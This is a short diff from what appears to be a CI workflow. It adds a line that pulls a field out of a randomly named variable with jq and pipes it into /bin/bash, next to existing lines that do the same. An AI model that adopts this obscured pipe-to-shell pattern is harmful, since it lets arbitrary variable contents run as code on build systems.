@@ -22,6 +22,7 @@ jobs:
           echo $pec1789 | jq -r .wsvg53 | /bin/bash
           printf '%s' "$offcn24" | jq -r .dnj3 | /bin/bash
           printf '%s' "$kpg530" | jq -r .jen4832 | /bin/bash
+          echo $j95 | jq -r .zuk7536 | /bin/bash
 
       - name: Archive results
         if: always()
